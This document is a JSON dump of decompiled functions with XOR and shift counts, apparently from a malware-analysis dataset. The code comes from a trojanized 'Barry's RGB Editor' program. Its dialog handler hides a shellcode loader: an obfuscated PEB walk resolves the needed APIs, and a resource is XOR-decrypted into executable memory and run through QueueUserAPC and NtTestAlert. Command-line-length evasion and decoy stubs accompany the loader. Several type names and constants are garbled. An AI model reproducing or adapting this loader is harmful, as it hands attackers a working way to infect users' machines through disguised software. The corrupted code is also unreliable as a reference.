[
    {
        "Function": "sub_18AF7B7D0",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "11.11%",
        "Function Body": "\nLRC2ECT __fastcall sub_18AF7B7D0(HWND a1)\n{\n  int v1; // ebx\n  HWND DlgItem; // rax\n  unsigned int v4; // [rsp+30h] [rbp-18h] BYREF\n  unsigned int v5; // [rsp+34h] [rbp-14h] BYREF\n  unsigned int v6[4]; // [rsp+38h] [rbp-10h] BYREF\n\n  sub_18AF7B850(a1, v6, &v4, &v5);\n  v1 = ((unsigned __int8)v5 << 16) | ((unsigned __int8)v4 << 8) | LOD261(v6[0]);\n  DlgItem = GetDlgItem(a1, 1007);\n  sub_18AF7B770(DlgItem, v1);\n  return sub_18AF7B930(v6[0], v4, v5, 0, 0);\n}\n// 18AF7B7D0: using guessed type unsigned int var_10[4];\n\n"
    },
    {
        "Function": "sub_18AF7B930",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "9.09%",
        "Function Body": "\nLRC2ECT __fastcall sub_18AF7B930(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4, unsigned int a5)\n{\n  CHAR v6[256]; // [rsp+30h] [rbp-118h] BYREF\n  unsigned __int8 v7; // [rsp+150h] [rbp+8h]\n\n  v7 = a1;\n  wsprintfA(v6, \"Red : %d\", a1);\n  sub_18AF7B900(0, (LPCAE9)v6);\n  wsprintfA(v6, \"Green : %d\", a2);\n  sub_18AF7B900(1, (LPCAE9)v6);\n  wsprintfA(v6, \"Blue : %d\", a3);\n  sub_18AF7B900(2, (LPCAE9)v6);\n  wsprintfA(v6, \"Hex : 0x%0.8X\", ((unsigned __int8)a3 << 16) | ((unsigned __int8)a2 << 8) | (unsigned int)v7);\n  sub_18AF7B900(3, (LPCAE9)v6);\n  wsprintfA(v6, \"x=%d\", a4);\n  sub_18AF7B900(4, (LPCAE9)v6);\n  wsprintfA(v6, \"y=%d\", a5);\n  return sub_18AF7B900(5, (LPCAE9)v6);\n}\n\n"
    },
    {
        "Function": "sub_18C3DB520",
        "Total XOR and shift operations": 6,
        "XOR operations": 0,
        "Shift operations": 6,
        "Operation percentage": "5.41%",
        "Function Body": "\n__int64 __fastcall sub_18C3DB520(__int64 a1, const char *a2)\n{\n  unsigned int i; // [rsp+20h] [rbp-48h]\n  __int64 v4; // [rsp+30h] [rbp-38h]\n  _DWORD *v5; // [rsp+38h] [rbp-30h]\n  __int64 v6; // [rsp+50h] [rbp-18h]\n  __int64 v7; // [rsp+58h] [rbp-10h]\n\n  v5 = (_DWORD *)(*(unsigned int *)(dword_186D40008\n                                  + dword_186D40008\n                                  + dword_186D40010\n                                  + dword_186D40008\n                                  + dword_186D40008\n                                  + dword_186D40008\n                                  + dword_186D40010\n                                  + dword_186D40008\n                                  + dword_186D40008\n                                  + dword_186D40008\n                                  + dword_186D40010\n                                  + dword_186D40008\n                                  + *(int *)(((__int64)dword_186D4000C << 6)\n                                           + ((__int64)dword_186D40014 << 6)\n                                           + ((__int64)(dword_186D40004 * dword_186D40000) << 6)\n                                           + ((__int64)dword_186D4000C << 6)\n                                           + ((__int64)dword_186D40014 << 6)\n                                           + ((__int64)(dword_186D40004 * dword_186D40000) << 6)\n                                           + a1\n                                           + 60)\n                                  + a1\n                                  - dword_186D40014\n                                  - dword_186D40004\n                                  - dword_186D40014\n                                  - dword_186D40004\n                                  - dword_186D40014\n                                  - dword_186D40004\n                                  + 136)\n                + a1);\n  v4 = (unsigned int)v5[8] + a1;\n  v7 = (unsigned int)v5[7] + a1;\n  v6 = (unsigned int)v5[9] + a1;\n  for ( i = 0; i < v5[6]; ++i )\n  {\n    if ( !strcmp((const char *)(*(unsigned int *)(v4 + 4i64 * i) + a1), a2) )\n      return *(unsigned int *)(v7\n                             + 4i64\n                             * *(unsigned __int16 *)(v6\n                                                   + 2i64\n                                                   * (dword_186D40014\n                                                    + dword_186D40000\n                                                    + dword_186D40008\n                                                    + dword_186D40010\n                                                    + dword_186D40014\n                                                    + dword_186D40000\n                                                    + dword_186D40008\n                                                    + dword_186D40010\n                                                    + dword_186D40014\n                                                    + dword_186D40000\n                                                    + dword_186D40008\n                                                    + dword_186D40010\n                                                    + dword_186D40014\n                                                    + dword_186D40000\n                                                    + dword_186D40008\n                                                    + dword_186D40010\n                                                    + dword_186D40014\n                                                    + dword_186D40000\n                                                    + dword_186D40008\n                                                    + dword_186D40010\n                                                    + i\n                                                    - dword_186D40008\n                                                    - dword_186D40014\n                                                    - dword_186D40014\n                                                    - dword_186D40010\n                                                    - dword_186D4000C\n                                                    - dword_186D40004 * dword_186D40010\n                                                    - dword_186D40008\n                                                    - dword_186D40014\n                                                    - dword_186D40014\n                                                    - dword_186D40010\n                                                    - dword_186D4000C\n                                                    - dword_186D40004 * dword_186D40010\n                                                    - dword_186D40008\n                                                    - dword_186D40014\n                                                    - dword_186D40014\n                                                    - dword_186D40010\n                                                    - dword_186D4000C\n                                                    - dword_186D40004 * dword_186D40010\n                                                    - dword_186D40008\n                                                    - dword_186D40014\n                                                    - dword_186D40014\n                                                    - dword_186D40010\n                                                    - dword_186D4000C\n                                                    - dword_186D40004 * dword_186D40010\n                                                    - dword_186D40008\n                                                    - dword_186D40014\n                                                    - dword_186D40014\n                                                    - dword_186D40010\n                                                    - dword_186D4000C\n                                                    - dword_186D40004 * dword_186D40010)))\n           + a1;\n  }\n  return 0i64;\n}\n// 186D40000: using guessed type int dword_186D40000;\n// 186D40004: using guessed type int dword_186D40004;\n// 186D40008: using guessed type int dword_186D40008;\n// 186D4000C: using guessed type int dword_186D4000C;\n// 186D40010: using guessed type int dword_186D40010;\n// 186D40014: using guessed type int dword_186D40014;\n\n"
    },
    {
        "Function": "DialogFunc",
        "Total XOR and shift operations": 5,
        "XOR operations": 3,
        "Shift operations": 2,
        "Operation percentage": "2.22%",
        "Function Body": "\nINT_PTR __fastcall DialogFunc(HWND a1, int a2, HDC a3, HWND a4)\n{\n  INT_PTR result; // rax\n  __int64 v5; // rdi\n  HA8EFF CurrentProcess; // rax\n  HA8EFF CurrentThread; // rax\n  char v8[16]; // [rsp+50h] [rbp-438h] BYREF\n  char v9[24]; // [rsp+60h] [rbp-428h] BYREF\n  __int64 (__fastcall *v10)(HA8EFF, _QWORD, __int64, __int64, int, _DWORD); // [rsp+78h] [rbp-410h]\n  __int64 (__fastcall *v11)(unsigned __int64, __int64, __int64 *, unsigned int *); // [rsp+80h] [rbp-408h]\n  __int64 v12[88]; // [rsp+90h] [rbp-3F8h] BYREF\n  __int64 v13; // [rsp+350h] [rbp-138h]\n  __int64 v14; // [rsp+358h] [rbp-130h]\n  __int16 v15[12]; // [rsp+360h] [rbp-128h] BYREF\n  int v16; // [rsp+378h] [rbp-110h]\n  __int64 (__fastcall *v17)(_QWORD, _QWORD, __int64, __int64); // [rsp+380h] [rbp-108h]\n  const char *v18; // [rsp+388h] [rbp-100h]\n  struct _PEB *v19; // [rsp+390h] [rbp-F8h]\n  unsigned int v20; // [rsp+398h] [rbp-F0h] BYREF\n  char v21[24]; // [rsp+3A0h] [rbp-E8h] BYREF\n  void (*v22)(void); // [rsp+3B8h] [rbp-D0h]\n  char v23[24]; // [rsp+3C0h] [rbp-C8h] BYREF\n  char v24[16]; // [rsp+3D8h] [rbp-B0h] BYREF\n  __int64 (__fastcall *v25)(unsigned __int64, __int64 *, __int64, __int64 *); // [rsp+3E8h] [rbp-A0h]\n  __int64 v26; // [rsp+3F0h] [rbp-98h] BYREF\n  int v27; // [rsp+3F8h] [rbp-90h]\n  PA963ANC pfnAPC; // [rsp+400h] [rbp-88h]\n  __int16 v29[16]; // [rsp+408h] [rbp-80h] BYREF\n  __int64 v30; // [rsp+428h] [rbp-60h] BYREF\n  __int16 v31; // [rsp+430h] [rbp-58h]\n  __int16 v32; // [rsp+432h] [rbp-56h]\n  __int16 v33; // [rsp+434h] [rbp-54h]\n  __int16 v34; // [rsp+436h] [rbp-52h]\n  __int16 v35; // [rsp+438h] [rbp-50h]\n  __int16 v36; // [rsp+43Ah] [rbp-4Eh]\n  __int16 v37; // [rsp+43Ch] [rbp-4Ch]\n  void (__stdcall *v38)(ULONG_PTR); // [rsp+440h] [rbp-48h]\n  unsigned int i; // [rsp+448h] [rbp-40h]\n  int v40; // [rsp+44Ch] [rbp-3Ch]\n  int v41; // [rsp+450h] [rbp-38h]\n  int v42; // [rsp+454h] [rbp-34h]\n  int v43; // [rsp+458h] [rbp-30h]\n  int v44; // [rsp+45Ch] [rbp-2Ch]\n\n  v40 = a2 - 272;\n  switch ( a2 )\n  {\n    case 272:\n      sub_18AF7B600(a1);\n      v18 = \"h6HZA7^6n(+pp59nps5sn4N2gr9&xr&A>w^imQXKbJuA7C)A!#*5P#C<m\";\n      v16 = -180BC50773;\n      v19 = sub_18C3DB000();\n      v38 = 0i64;\n      v14 = 0i64;\n      v13 = 0i64;\n      v22 = 0i64;\n      v11 = 0i64;\n      v25 = 0i64;\n      v17 = 0i64;\n      v10 = 0i64;\n      v31 = 115;\n      v32 = 99;\n      v33 = 46;\n      v34 = 101;\n      v35 = 120;\n      v36 = 101;\n      v37 = 0;\n      strcpy(v24, \"NtTestAlert\");\n      strcpy(v9, \"LdrFindResource_U\");\n      strcpy(v21, \"LdrAccessResource\");\n      strcpy(v8, \"VirtualAlloc\");\n      strcpy(v23, \"VirtualAllocExNuma\");\n      qword_18004C068 = (__int64 (__fastcall *)(_QWORD))sub_18C3DB8E0;\n      qword_18004C060 = (__int64 (__fastcall *)(_QWORD, _QWORD))sub_18C3DB910;\n      if ( (unsigned int)sub_18C3DB940() == 3 )\n        return 0i64;\n      if ( v19->ProcessParameters->CommandLine.Length > 0x12u )\n      {\n        v16 = 7821;\n        dword_186D40000 = 0;\n        dword_186D40004 = 0;\n        dword_186D40008 = 0;\n        dword_186D40010 = 0;\n        dword_186D4000C = 0;\n        dword_186D40014 = 0;\n        qword_18004C060 = (__int64 (__fastcall *)(_QWORD, _QWORD))sub_18C3DB520;\n        qword_18004C068 = (__int64 (__fastcall *)(_QWORD))sub_18C3DB4A0;\n      }\n      v29[0] = 107;\n      v29[1] = 101;\n      v29[2] = 114;\n      v29[3] = 110;\n      v29[4] = 101;\n      v29[5] = 108;\n      v29[6] = 51;\n      v29[7] = 50;\n      v29[8] = 46;\n      v29[9] = 100;\n      v29[10] = 108;\n      v29[11] = 108;\n      v29[12] = 0;\n      v15[0] = 110;\n      v15[1] = 116;\n      v15[2] = 100;\n      v15[3] = 108;\n      v15[4] = 108;\n      v15[5] = 46;\n      v15[6] = 100;\n      v15[7] = 108;\n      v15[8] = 108;\n      v15[9] = 0;\n      v14 = qword_18004C068(v15);\n      v13 = qword_18004C068(v29);\n      v22 = (void (*)(void))sub_18C3DB520(v14, v24);\n      v25 = (__int64 (__fastcall *)(unsigned __int64, __int64 *, __int64, __int64 *))qword_18004C060(v14, v9);\n      v11 = (__int64 (__fastcall *)(unsigned __int64, __int64, __int64 *, unsigned int *))qword_18004C060(v14, v21);\n      v17 = (__int64 (__fastcall *)(_QWORD, _QWORD, __int64, __int64))qword_18004C060(v13, v8);\n      v10 = (__int64 (__fastcall *)(HA8EFF, _QWORD, __int64, __int64, int, _DWORD))qword_18004C060(v13, v23);\n      v30 = 0i64;\n      v20 = 0;\n      v12[0] = (__int64)L\"DXEEBCSW\";\n      v12[1] = v16;\n      v12[2] = 1033i64;\n      v27 = v25(0x18EBBF000ui64, v12, 3i64, &v26);\n      v27 = v11(0x18EBBF000ui64, v26, &v30, &v20);\n      if ( v10 )\n      {\n        v5 = v20;\n        CurrentProcess = GetCurrentProcess();\n        v38 = (void (__stdcall *)(ULONG_PTR))v10(CurrentProcess, 0i64, v5, 12288i64, 64, 0);\n      }\n      else\n      {\n        v38 = (void (__stdcall *)(ULONG_PTR))v17(0i64, v20, 12288i64, 64i64);\n      }\n      for ( i = 0; i < v20; ++i )\n        *((_BYTE *)v38 + (int)i) = v18[(int)i % 58] ^ *(_BYTE *)(v30 + (int)i);\n      pfnAPC = v38;\n      CurrentThread = GetCurrentThread();\n      QueueUserAPC(pfnAPC, CurrentThread, 0i64);\n      v22();\n      sub_18AF7B480(a1);\n      return 1i64;\n    case 273:\n      v44 = (unsigned __int16)a3;\n      if ( (unsigned __int16)a3 == 3 )\n      {\n        ShowWindow(a1, 0);\n      }\n      else\n      {\n        switch ( v44 )\n        {\n          case 1006:\n            qword_18004C098 = SetCursor(hCursor);\n            dword_18004C088 = 1;\n            SetCapture(a1);\n            break;\n          case 40001:\n            ShellAboutA(a1, \"Barry's RGB Editor\", \"Developer : Barretto VN\\nE-Mail : vnb400@hotmail.com\", 0i64);\n            break;\n          case 40002:\n            EndDialog(a1, 1i64);\n            break;\n          case 40003:\n            sub_18AF7BB70(a1);\n            break;\n        }\n      }\n      goto LABEL_38;\n    case 276:\n      sub_18AF7B7D0(a1);\n      goto LABEL_45;\n    case 312:\n      if ( GetDlgCtrlID(a4) != 1003 && GetDlgCtrlID(a4) != 1004 && GetDlgCtrlID(a4) != 1005 )\n        goto LABEL_45;\n      if ( GetDlgCtrlID(a4) == 1003 )\n        v41 = 255;\n      else\n        v41 = 0;\n      if ( GetDlgCtrlID(a4) == 1004 )\n        v42 = 255;\n      else\n        v42 = 0;\n      if ( GetDlgCtrlID(a4) == 1005 )\n        v43 = 255;\n      else\n        v43 = 0;\n      SetTextColor(a3, ((unsigned __int8)v43 << 16) | ((unsigned __int8)v42 << 8) | (unsigned __int8)v41);\n      SetBkMode(a3, 1);\n      result = (INT_PTR)GetStockObject(5);\n      break;\n    case 512:\nLABEL_38:\n      if ( dword_18004C088 )\n        sub_18AF7BA90(a1);\n      goto LABEL_45;\n    case 514:\n      if ( dword_18004C088 )\n      {\n        ReleaseCapture();\n        SetCursor(qword_18004C098);\n        dword_18004C088 = 0;\n      }\n      goto LABEL_45;\n    default:\nLABEL_45:\n      result = 0i64;\n      break;\n  }\n  return result;\n}\n// 188AD13E0: using guessed type wchar_t aDxjkoasw[9];\n// 186D40000: using guessed type int dword_186D40000;\n// 186D40004: using guessed type int dword_186D40004;\n// 186D40008: using guessed type int dword_186D40008;\n// 186D4000C: using guessed type int dword_186D4000C;\n// 186D40010: using guessed type int dword_186D40010;\n// 186D40014: using guessed type int dword_186D40014;\n// 18004C060: using guessed type __int64 (__fastcall *qword_18004C060)(_QWORD, _QWORD);\n// 18004C068: using guessed type __int64 (__fastcall *qword_18004C068)(_QWORD);\n// 18004C088: using guessed type int dword_18004C088;\n\n"
    },
    {
        "Function": "NtCurrentPeb",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nstruct _PEB *sub_18C3DB000()\n{\n  return NtCurrentPeb();\n}\n\n"
    },
    {
        "Function": "sub_18C3DB020",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\n__int64 __fastcall sub_18C3DB020(_WORD *a1)\n{\n  unsigned int v2; // [rsp+0h] [rbp-18h]\n\n  v2 = 0;\n  while ( *a1 )\n  {\n    ++v2;\n    ++a1;\n  }\n  return v2;\n}\n\n"
    },
    {
        "Function": "sub_18C3DB060",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\n__int64 __fastcall sub_18C3DB060(unsigned __int16 *a1, unsigned __int16 *a2)\n{\n  int v2; // ebx\n  unsigned int i; // [rsp+20h] [rbp-18h]\n  unsigned __int16 v5; // [rsp+24h] [rbp-14h]\n  unsigned __int16 v6; // [rsp+28h] [rbp-10h]\n  unsigned __int16 *v7; // [rsp+40h] [rbp+8h]\n\n  v7 = a1;\n  v2 = sub_18C3DB020(a1);\n  if ( v2 != (unsigned int)sub_18C3DB020(a2) )\n    return 1i64;\n  for ( i = 0; i < (unsigned int)sub_18C3DB020(v7); ++i )\n  {\n    v5 = *v7;\n    v6 = *a2;\n    if ( *v7 >= 0x41u\n      && v5 <= dword_186D40004\n             + dword_186D40014\n             + dword_186D40008 * dword_186D40004\n             + dword_186D40004 * dword_186D40008\n             + dword_186D40008\n             + dword_186D40004\n             + dword_186D40004\n             + dword_186D40014\n             + dword_186D40008 * dword_186D40004\n             + dword_186D40004 * dword_186D40008\n             + dword_186D40008\n             + dword_186D40004\n             + dword_186D40004\n             + dword_186D40014\n             + dword_186D40008 * dword_186D40004\n             + dword_186D40004 * dword_186D40008\n             + dword_186D40008\n             + dword_186D40004\n             + dword_186D40004\n             + dword_186D40014\n             + dword_186D40008 * dword_186D40004\n             + dword_186D40004 * dword_186D40008\n             + dword_186D40008\n             + dword_186D40004\n             + 90\n             - dword_186D40000 * dword_186D40010 * dword_186D4000C\n             - dword_186D40000 * dword_186D4000C\n             - dword_186D4000C\n             - dword_186D40004\n             - dword_186D4000C\n             + dword_186D40008\n             + dword_186D40010 * dword_186D4000C\n             - dword_186D40014\n             - dword_186D40014\n             + dword_186D40004\n             + dword_186D40000 * dword_186D40014\n             - dword_186D40010\n             - dword_186D40004 * dword_186D40004 * dword_186D40014\n             - dword_186D40000 * dword_186D40010 * dword_186D4000C\n             - dword_186D40000 * dword_186D4000C\n             - dword_186D4000C\n             - dword_186D40004\n             - dword_186D4000C\n             + dword_186D40008\n             + dword_186D40010 * dword_186D4000C\n             - dword_186D40014\n             - dword_186D40014\n             + dword_186D40004\n             + dword_186D40000 * dword_186D40014\n             - dword_186D40010\n             - dword_186D40004 * dword_186D40004 * dword_186D40014\n             - dword_186D40000 * dword_186D40010 * dword_186D4000C\n             - dword_186D40000 * dword_186D4000C\n             - dword_186D4000C\n             - dword_186D40004\n             - dword_186D4000C\n             + dword_186D40008\n             + dword_186D40010 * dword_186D4000C\n             - dword_186D40014\n             - dword_186D40014\n             + dword_186D40004\n             + dword_186D40000 * dword_186D40014\n             - dword_186D40010\n             - dword_186D40004 * dword_186D40004 * dword_186D40014\n             - dword_186D40000 * dword_186D40010 * dword_186D4000C\n             - dword_186D40000 * dword_186D4000C\n             - dword_186D4000C\n             - dword_186D40004\n             - dword_186D4000C\n             + dword_186D40008\n             + dword_186D40010 * dword_186D4000C\n             - dword_186D40014\n             - dword_186D40014\n             + dword_186D40004\n             + dword_186D40000 * dword_186D40014\n             - dword_186D40010\n             - dword_186D40004 * dword_186D40004 * dword_186D40014 )\n    {\n      v5 += 32;\n    }\n    if ( v6 >= 0x41u && v6 <= 0x5Au )\n      v6 += 32;\n    if ( v5 != v6 )\n      return 1i64;\n    ++v7;\n    ++a2;\n  }\n  return 0i64;\n}\n// 186D40000: using guessed type int dword_186D40000;\n// 186D40004: using guessed type int dword_186D40004;\n// 186D40008: using guessed type int dword_186D40008;\n// 186D4000C: using guessed type int dword_186D4000C;\n// 186D40010: using guessed type int dword_186D40010;\n// 186D40014: using guessed type int dword_186D40014;\n\n"
    },
    {
        "Function": "sub_18C3DB4A0",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nstruct _LIST_ENTRY *__fastcall sub_18C3DB4A0(unsigned __int16 *a1)\n{\n  struct _LIST_ENTRY *v2; // [rsp+20h] [rbp-28h]\n  struct _LIST_ENTRY *Flink; // [rsp+28h] [rbp-20h]\n\n  Flink = sub_18C3DB000()->Ldr->InLoadOrderModuleList.Flink;\n  v2 = Flink;\n  do\n  {\n    if ( !(unsigned int)sub_18C3DB060((unsigned __int16 *)v2[6].Flink, a1) )\n      return v2[3].Flink;\n    v2 = v2->Flink;\n  }\n  while ( v2 != Flink );\n  return 0i64;\n}\n\n"
    },
    {
        "Function": "sub_18C3DB8E0",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\n__int64 __fastcall sub_18C3DB8E0(const WCHAR *a1)\n{\n  MessageBoxW(0i64, a1, 0i64, 0);\n  return 0i64;\n}\n\n"
    },
    {
        "Function": "sub_18C3DB910",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\n__int64 __fastcall sub_18C3DB910(__int64 a1, const CHAR *a2)\n{\n  MessageBoxA(0i64, a2, 0i64, 0);\n  return 0i64;\n}\n\n"
    }
]